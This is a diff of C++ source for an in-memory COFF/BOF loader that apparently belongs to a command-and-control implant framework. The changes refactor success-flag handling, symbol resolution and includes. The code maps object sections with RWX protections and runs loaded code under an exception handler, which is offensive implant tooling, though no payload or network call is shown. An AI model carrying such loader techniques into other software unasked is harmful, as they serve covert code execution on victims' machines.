@@ -1,15 +1,14 @@
 #include <core/include/objects.hpp>
 
+using namespace Hash;
 using namespace Xtea;
+using namespace Utils;
 using namespace Opsec;
 using namespace Stream;
-using namespace Memory::Methods;
 using namespace Utils::Scanners;
-using namespace Utils;
+using namespace Memory::Methods;
 
 namespace Objects {
-
-    PVOID DATA wrapper_return = nullptr;
 
     // TODO: add common BOF/internal implant functions
     HASH_MAP RDATA internal_map[] = {
@@ -32,7 +31,7 @@ namespace Objects {
         { .name = 0, .address = nullptr },
     };
 
-
+    PVOID DATA wrapper_return = nullptr;
     LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {
 
         _stream *stream = CreateTaskResponse(TypeError);
@@ -69,7 +68,7 @@ namespace Objects {
         }
         // __imp_
         if (HashStringA(sym_string, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
-            bool import = SymbolScan(sym_string, '$', MbsLength(sym_string));
+            bool import = StringChar(sym_string, '$', MbsLength(sym_string));
 
             if (import) {
                 char buffer[MAX_PATH] = { };
@@ -110,12 +109,11 @@ namespace Objects {
         void *entrypoint = nullptr;
         char *sym_name   = nullptr;
 
-        bool success = true;
+        bool success = false;
         const auto file_head = image->nt_head->FileHeader;
 
         // NOTE: register veh as execution safety net
         if (!(veh_handle = ctx->memapi.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
-            success = false;
             goto defer;
         }
 
@@ -136,7 +134,6 @@ namespace Objects {
                 case IMAGE_SCN_MEM_RW:      protect = PAGE_READWRITE; break;
                 case IMAGE_SCN_MEM_RWX:     protect = PAGE_EXECUTE_READWRITE; break;
                 default:
-                    success = false;
                     goto defer;
                 }
 
@@ -145,7 +142,6 @@ namespace Objects {
                 }
 
                 if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (void **) &image->sec_map[sec_index].address, &image->sec_map[sec_index].size, protect, nullptr))) {
-                    success = false;
                     goto defer;
                 }
             }
@@ -153,7 +149,6 @@ namespace Objects {
 
         if (image->fn_map->size) {
             if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (void **) &image->fn_map->address, &image->fn_map->size, PAGE_READONLY, nullptr))) {
-                success = false;
                 goto defer;
             }
         }
@@ -183,13 +178,13 @@ namespace Objects {
                 const auto section = ITER_SECTION_HEADER(image->buffer, sec_index);
 
                 if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != IMAGE_SCN_MEM_EXECUTE) {
-                    success = false;
                     goto defer;
                 }
             }
         }
 
         WrapperFunction(entrypoint, args, size);
+        success = true;
 
     defer:
         if (veh_handle) {
@@ -204,8 +199,8 @@ namespace Objects {
         char sym_name[9]    = { };
         char *name_ptr      = nullptr;
 
-        uint32 fn_count   = 0;
-        bool success        = true;
+        uint32 fn_count = 0;
+        bool success = false;
 
         for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
             void *function = nullptr;
@@ -227,10 +222,9 @@ namespace Objects {
 
                 void *reloc_addr    = image->sec_map[sec_index].address + reloc->VirtualAddress;
                 void *sec_addr      = image->sec_map[head->SectionNumber - 1].address;
-                void *fn_addr       = image->fn_map + (fn_count * sizeof(void*));
+                void *fn_addr       = image->fn_map + (fn_count * sizeof(void *));
 
                 if (!ProcessSymbol(name_ptr, &function)) {
-                    success = false;
                     goto defer;
                 }
 #if _WIN64
@@ -282,6 +276,8 @@ namespace Objects {
                 reloc += sizeof(_reloc);
             }
         }
+
+        success = true;
 
         defer:
         return success;
